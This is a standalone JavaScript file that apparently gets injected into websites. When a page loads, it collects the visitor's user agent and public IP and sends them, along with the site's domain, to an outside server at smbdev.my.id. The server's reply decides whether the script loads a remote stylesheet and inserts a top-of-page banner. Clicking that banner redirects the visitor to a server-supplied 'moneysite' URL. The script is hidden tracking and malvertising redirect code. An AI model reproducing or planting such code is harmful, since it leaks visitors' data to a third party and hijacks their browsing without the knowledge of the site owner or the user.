const apiUrl = "https://smbdev.my.id/Apiv2";
var jqueryScript = document.createElement("script");
(jqueryScript.src = "https://code.jquery.com/jquery-3.6.4.min.js"), document.head.appendChild(jqueryScript);
const userAgent = navigator.userAgent;
console.log("User Agent:", userAgent),
    fetch("https://api64.ipify.org?format=json")
        .then((e) => e.json())
        .then((e) => {
            let t = e.ip;
            console.log("IP Client:", t),
                fetch("https://smbdev.my.id/Apiv2", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ domain: window.location.hostname, userAgent: userAgent, ip: t }) })
                    .then((e) => e.json())
                    .then((e) => {
                        if (e.code) {
                            var t = e.moneysite,
                                s = e.idadvs,
                                n = e.banner,
                                r = document.createElement("link");
                            function o() {
                                var e = document.createElement("img");
                                (e.src = n),
                                    (e.className = "responsive center"),
                                    (e.style.zIndex = "9999"),
                                    (e.style.position = "static"),
                                    (e.id = "follome"),
                                    document.body.insertBefore(e, document.body.firstChild),
                                    jQuery("#follome").click(function () {
                                      //  var e = t + "/?adv=" + s + "&web=" + document.location.hostname;
                                         var e = t;
                                        console.log("go to"+t);
                                        (document.location.href = e), console.log(e);
                                    });
                            }
                            (r.rel = "stylesheet"), (r.type = "text/css"), (r.href = "https://cdn.jsdelivr.net/gh/semburat/css@main/appv4.css"), document.head.appendChild(r), o();
                        } else console.log("API request failed. Your domain is not good =0.");
                    })
                    .catch((e) => {
                        console.error("Error:", e);
                    });
        })
        .catch((e) => console.error("Failed to get IP:", e));
